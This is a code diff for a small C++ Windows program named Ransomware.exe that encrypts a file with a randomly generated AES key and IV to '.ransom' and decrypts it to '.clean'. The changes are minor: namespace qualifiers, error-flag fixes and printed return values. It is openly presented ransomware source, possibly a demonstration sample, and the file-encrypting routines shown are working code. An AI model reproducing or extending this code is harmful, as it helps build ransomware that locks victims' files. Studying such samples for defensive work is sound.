@@ -92,7 +92,7 @@ BOOL DeRansomFile( const char* szFileName )
 		//
 		char szNewPath[ MAX_PATH ]{ };
 		strcpy_s( szNewPath, szFileName );
-		PathRemoveExtensionA( szNewPath );
+		::PathRemoveExtensionA( szNewPath );
 		strcat_s( szNewPath, ".clean" );
 
 		hFile = ::CreateFileA(
@@ -106,6 +106,7 @@ BOOL DeRansomFile( const char* szFileName )
 		);
 		if( !hFile || hFile == INVALID_HANDLE_VALUE )
 		{
+			bResult = FALSE;
 			printf( __FUNCTION__ " -- CreateFileA failed %d\n", ::GetLastError( ) );
 			goto Exit;
 		}
@@ -164,8 +165,8 @@ BOOL RansomFile( const char* szFileName )
 	//
 	// Generate crypto random IV and AES key
 	//
-	BCryptGenRandom( NULL, pbKey, dwKeyLen, BCRYPT_USE_SYSTEM_PREFERRED_RNG );
-	BCryptGenRandom( NULL, pbIV, dwIVLen, BCRYPT_USE_SYSTEM_PREFERRED_RNG );
+	::BCryptGenRandom( NULL, pbKey, dwKeyLen, BCRYPT_USE_SYSTEM_PREFERRED_RNG );
+	::BCryptGenRandom( NULL, pbIV, dwIVLen, BCRYPT_USE_SYSTEM_PREFERRED_RNG );
 
 	{
 		//
@@ -207,7 +208,7 @@ BOOL RansomFile( const char* szFileName )
 		//
 		char szNewPath[ MAX_PATH ]{ };
 		strcpy_s( szNewPath, szFileName );
-		PathRemoveExtensionA( szNewPath );
+		::PathRemoveExtensionA( szNewPath );
 		strcat_s( szNewPath, ".ransom" );
 
 		hFile = ::CreateFileA(
@@ -221,6 +222,7 @@ BOOL RansomFile( const char* szFileName )
 		);
 		if( !hFile || hFile == INVALID_HANDLE_VALUE )
 		{
+			bResult = FALSE;
 			printf( __FUNCTION__ " -- CreateFileA failed %d\n", ::GetLastError( ) );
 			goto Exit;
 		}
@@ -258,11 +260,11 @@ int main( int argc, char** argv )
 	{
 		if( _stricmp( "e", argv[ 1 ] + 1 ) == 0 )
 		{
-			RansomFile( argv[ 2 ] );
+			printf( "RansomFile returned %d\n", RansomFile( argv[ 2 ] ) );
 		}
 		else if( _stricmp( "d", argv[ 1 ] + 1 ) == 0 )
 		{
-			DeRansomFile( argv[ 2 ] );
+			printf( "DeRansomFile returned %d\n", DeRansomFile( argv[ 2 ] ) );
 		}
 		else
 		{
@@ -271,7 +273,7 @@ int main( int argc, char** argv )
 		exit( 0 );
 	}
 
-	Dispatch:
+Dispatch:
 	printf( "Ransomware.exe -e [filepath]\tEncrypts a file.\n" );
 	printf( "Ransomware.exe -d [filepath]\tDecrypts a file.\n" );
 
